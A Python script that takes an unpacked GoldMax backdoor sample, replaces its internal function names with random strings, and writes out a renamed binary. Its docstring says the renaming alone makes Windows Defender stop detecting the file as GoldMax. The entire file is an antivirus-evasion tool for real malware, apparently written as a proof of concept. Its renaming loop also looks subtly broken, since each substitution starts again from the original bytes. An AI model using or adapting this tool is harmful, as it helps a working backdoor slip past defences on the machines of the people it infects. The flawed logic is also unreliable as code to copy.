import re
import string
import random
import hashlib
from time import time
from argparse import ArgumentParser
from colorama import Fore as Color

"""
Used to update default GoldMax values for PoC

- Validated against Windows 11 22H2
    - After only updating the function names, Defender's no longer detects file as GoldMax

- Expects a UPX unpacked sample

"""


class GoldMaxConfig:
    def __init__(self, target_file=""):
        self.target_file = target_file
        self.goldmax = b""
        self.beacon_interval = None
        self.c2_domain = None
        self.log_file = None
        self.http_headers = None
        self.default_functions = [
                        "main.main",
                        "main.send_command_result",
                        "main.false_requesting",
                        "main.encrypt",
                        "main.decrypt",
                        "main.random",
                        "main.request_session_key",
                        "main.define_internal_settings",
                        "main.send_file_part",
                        "main.clean_file",
                        "main.send_command_results",
                        "main.retrieve_session_key",
                        "main.save_internal_settings",
                        "main.resolve_command",
                        "main.write_file",
                        "main.beaconing",
                        "main.wget_file",
                        "main.fileExists",
                        "main.removeBase64Padding",
                        "main.addBase64Padding",
                        "main.delete_empty",
                        "main.GetMD5Hash"
                    ]

    @staticmethod
    def gen_name(length=1):
        new_name = ''.join(random.choices(string.ascii_letters, k=length))
        return str(new_name)

    def update(self):

        # Attempt to read file
        self.load_file()

        # If we read in a file successfully, attempt to update all the features
        if self.goldmax:
            self.update_functions()

    def load_file(self):
        """Read in GoldMax sample"""
        print(Color.LIGHTYELLOW_EX + f"[!] Loading {self.target_file} ...", Color.RESET)

        with open(self.target_file, "rb") as f:
            goldmax_bin = f.read()

        if goldmax_bin:
            self.goldmax = goldmax_bin

    @staticmethod
    def find_str_length(blob):
        func = blob.split(".")[1]
        return len(func)

    def update_functions(self):
        """Update internal names"""
        new_bin = b""

        print(Color.LIGHTYELLOW_EX + "[!] Updating internal functions:", Color.RESET)
        for function in self.default_functions:
            unique_name = "main." + self.gen_name(self.find_str_length(function))
            new_bin = re.sub(function.encode(), unique_name.encode(), self.goldmax)
            print(f"\t{function} --> {unique_name}")

        if not self.validate_update(new_bin):
            print(Color.RED + "[-] Failed to update all functions!", Color.RESET)
        else:
            # Write updated bin to disk
            gold_hash = hashlib.shake_128(new_bin)
            new_target = "GoldMax_" + gold_hash.hexdigest(10) + ".bin"
            print(Color.GREEN + f"[+] Writing results to {new_target}", Color.RESET)
            with open(new_target, 'wb') as f:
                f.write(new_bin)

    def validate_update(self, blob):
        for func in self.default_functions:
            if blob.find(func.encode()) > 0:
                print(Color.RED + f"[-] We couldn't update: {func}", Color.RESET)
                return False

        return True


if __name__ == "__main__":

    parser = ArgumentParser()
    parser.add_argument('-f', "--file", metavar="", help="GoldMax sample to modify")
    args = parser.parse_args()

    if args.file:
        gold = GoldMaxConfig(target_file=args.file)
        gold.update()
    else:
        parser.print_help()
